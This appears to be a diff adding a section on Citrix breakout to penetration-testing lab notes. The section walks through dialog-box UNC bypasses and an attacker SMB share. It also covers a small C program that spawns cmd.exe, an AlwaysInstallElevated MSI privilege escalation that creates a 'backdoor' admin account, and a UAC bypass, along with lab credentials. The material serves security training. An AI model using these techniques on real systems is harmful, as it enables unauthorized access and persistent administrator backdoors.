@@ -3225,3 +3225,243 @@ Key Content : ILFREIGHTWIFI-CORP123908!
 
 ---
 
+# 🟦 Citrix Breakout 
+
+## 📝 Overview
+
+Many organizations use virtualized & restricted environments (Citrix, Terminal Services, AWS AppStream, CyberArk PSM, Kiosk mode). These typically implement **GPO lockdowns** to prevent users from accessing system tools like:
+
+* `cmd.exe`
+* `powershell.exe`
+* `C:\Windows\system32`
+
+However, attackers can still **break out** by abusing dialog boxes, UNC paths, and alternate tools.
+
+
+## 🔐 Basic Breakout Methodology
+
+1. **Gain a dialog box** (Open/Save/Import/etc.)
+2. **Exploit the dialog box** to reach filesystem or run binaries.
+3. **Obtain command execution** (cmd/PowerShell).
+4. **Privilege escalation**.
+
+
+## 🎯 Accessing the Citrix Target
+
+Visit the Citrix environment using RDP:
+
+```
+URL: http://humongousretail.com/remote/
+Username: pmorgan
+Password: Summer1Summer!
+Domain: htb.local
+```
+
+Download & launch `launch.ica` → restricted Citrix desktop.
+
+
+## 🚫 Restrictions Observed
+
+* File Explorer blocks paths like `C:\Users`
+* No `cmd.exe` or `powershell.exe` in Start Menu
+* Cannot browse SMB shares normally
+* Cannot access `C:\Windows\System32`
+
+
+
+## 🟦 Dialog Box Bypass
+
+## ➤ Using Paint
+
+Open **Paint → File → Open** to get a Windows dialog box.
+
+### UNC Bypass to Local Admin Share
+
+Enter in filename field:
+
+```
+\\127.0.0.1\c$\users\pmorgan
+```
+
+→ You bypass GPO and view folders.
+
+
+## 🟧 Accessing SMB Share From Restricted Environment
+
+## 1. Start SMB server on attacker machine
+
+```
+smbserver.py -smb2support share $(pwd)
+```
+
+## 2. In Citrix dialog box
+
+Use Paint → File → Open, then enter:
+
+```
+\\10.13.38.95\share
+```
+
+Set file type to **All Files** → you can now browse the SMB files.
+
+
+
+## 🚀 Running Executables Through the SMB Share
+
+Even if File Explorer can’t copy files, **you can execute them**.
+
+Right-click executable → **Open**.
+
+Example: run custom `pwn.exe`:
+
+### pwn.c
+
+```c
+#include <stdlib.h>
+int main() {
+  system("C:\\Windows\\System32\\cmd.exe");
+}
+```
+
+Running `pwn.exe` → spawns **cmd.exe** in Citrix.
+
+## 🗂 Copy files using CMD
+
+Example: copy tools from share to Desktop:
+
+```
+copy \\10.13.38.95\share\Bypass-UAC.ps1 C:\Users\pmorgan\Desktop
+copy \\10.13.38.95\share\PowerUp.ps1 C:\Users\pmorgan\Desktop
+```
+
+
+## 📁 Alternate File Browsers – Explorer++
+
+Explorer++ overcomes GPO folder restrictions and allows:
+
+* Browsing full C:\ drive
+* Copy/paste from SMB → Desktop
+
+Very useful in Citrix breakouts.
+
+
+## 🛠 Alternate Registry Editors
+
+Sometimes `regedit` is blocked. Use alternatives:
+
+* **Simpleregedit**
+* **Uberregedit**
+* **SmallRegistryEditor**
+
+These bypass GPO registry restrictions.
+
+
+## 🏃 Script Execution Breakout
+
+## 1. Create malicious batch file
+
+Create `evil.bat`:
+
+```
+cmd
+```
+
+Running it → spawns Command Prompt.
+
+
+## 🔼 Privilege Escalation
+
+### ➤ Using PowerUp.ps1 to detect AlwaysInstallElevated
+
+Upload `PowerUp.ps1`, then:
+
+```
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+Or manually check registry:
+
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+### Both return:
+
+```
+AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+→ **Vulnerable to MSI privilege escalation**.
+
+
+## 🧱 Exploiting AlwaysInstallElevated
+
+Create admin-adding MSI using PowerUp:
+
+```
+Import-Module .\PowerUp.ps1
+Write-UserAddMSI
+```
+
+This generates:
+
+```
+UserAdd.msi
+```
+
+Run `UserAdd.msi` → create admin user:
+
+```
+Username: backdoor
+Password: T3st@123
+Group: Administrators
+```
+
+
+
+## 🔄 Spawn Admin Shell via New User
+
+```
+runas /user:backdoor cmd
+```
+
+Enter password → admin CMD spawns.
+
+
+## 🟥 Bypassing UAC to Access Administrator Profile
+
+Even as Admin, UAC prevents access:
+
+```
+cd C:\Users\Administrator
+Access is denied.
+```
+
+Upload and run UAC bypass script:
+
+```
+Import-Module .\Bypass-UAC.ps1
+Bypass-UAC -Method UacMethodSysprep
+```
+
+A new elevated PowerShell window appears.
+
+Verify high integrity:
+
+```
+whoami /all
+whoami /priv
+```
+
+Now access Administrator profile:
+
+```
+cd C:\Users\Administrator\Desktop
+dir
+```
+
+
+---
+
